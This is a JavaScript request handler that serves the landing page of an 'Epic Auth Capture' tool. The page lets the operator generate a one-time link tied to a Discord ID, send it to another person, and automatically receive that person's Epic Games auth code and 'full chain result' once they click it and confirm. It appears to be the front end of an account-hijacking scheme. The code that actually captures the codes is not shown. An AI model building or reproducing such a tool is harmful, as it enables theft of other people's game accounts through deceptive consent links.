/**
 * GET /
 * Landing page — Person A visits this to generate a link.
 */
export default function handler(req, res) {
  const base = `https://${req.headers.host}`;
  console.log('[INDEX] hit from', req.headers['x-forwarded-for'] || 'local');
  res.setHeader('Content-Type', 'text/html');
  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Epic Auth Capture</title>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      background: #080808; color: #d0d0d0;
      font-family: -apple-system,'Segoe UI',system-ui,sans-serif;
      min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 24px;
    }
    .card {
      background: #101010; border: 1px solid #1e1e1e;
      border-radius: 20px; padding: 44px 40px;
      max-width: 500px; width: 100%;
    }
    h1 { font-size: 1.5em; color: #fff; margin-bottom: 8px; }
    .sub { color: #555; font-size: 0.88em; line-height: 1.6; margin-bottom: 32px; }
    label { display: block; font-size: 0.75em; color: #444; text-transform: uppercase; letter-spacing: .05em; margin-bottom: 8px; }
    input {
      width: 100%; background: #141414; border: 1px solid #252525;
      border-radius: 10px; color: #fff; padding: 13px 15px;
      font-size: 0.95em; outline: none; margin-bottom: 14px; transition: border .15s;
    }
    input:focus { border-color: #00e676; }
    input::placeholder { color: #333; }
    button {
      width: 100%; background: #00e676; color: #000;
      border: none; border-radius: 10px; padding: 15px;
      font-size: 1em; font-weight: 700; cursor: pointer; transition: opacity .15s;
    }
    button:hover { opacity: .85; }
    .how { margin-top: 32px; border-top: 1px solid #161616; padding-top: 24px; }
    .how-title { font-size: 0.75em; color: #333; text-transform: uppercase; letter-spacing: .05em; margin-bottom: 14px; }
    .step { display: flex; gap: 12px; margin-bottom: 10px; align-items: flex-start; }
    .sn {
      width: 22px; height: 22px; border-radius: 50%; background: #181818;
      color: #444; font-size: 0.75em; font-weight: 700;
      display: flex; align-items: center; justify-content: center; flex-shrink: 0;
    }
    .st { font-size: 0.83em; color: #444; line-height: 1.5; }
    .st strong { color: #666; }
  </style>
</head>
<body>
<div class="card">
  <h1>🎮 Epic Auth Capture</h1>
  <p class="sub">Generate a unique one-time link. Send it to the user. When they click it and confirm on Epic, the auth code arrives here automatically — no matter what network they're on.</p>

  <form onsubmit="generate(event)">
    <label>Discord User ID (optional label)</label>
    <input type="text" id="discordId" placeholder="e.g. 123456789012345678" autocomplete="off">
    <button type="submit">Generate Link</button>
  </form>

  <div class="how">
    <div class="how-title">How it works</div>
    <div class="step"><div class="sn">1</div><div class="st">You enter a Discord ID and click <strong>Generate Link</strong></div></div>
    <div class="step"><div class="sn">2</div><div class="st">A unique one-time URL is created and shown — send it to the user</div></div>
    <div class="step"><div class="sn">3</div><div class="st">User clicks the link on <strong>any PC, any network</strong> — as long as Epic is logged in</div></div>
    <div class="step"><div class="sn">4</div><div class="st">Auth code + full chain result appear here <strong>automatically</strong> — no refresh, no paste</div></div>
  </div>
</div>
<script>
function generate(e) {
  e.preventDefault();
  const id = document.getElementById('discordId').value.trim() || 'unknown';
  window.location.href = '/generate?discord_id=' + encodeURIComponent(id);
}
</script>
</body>
</html>`);
}
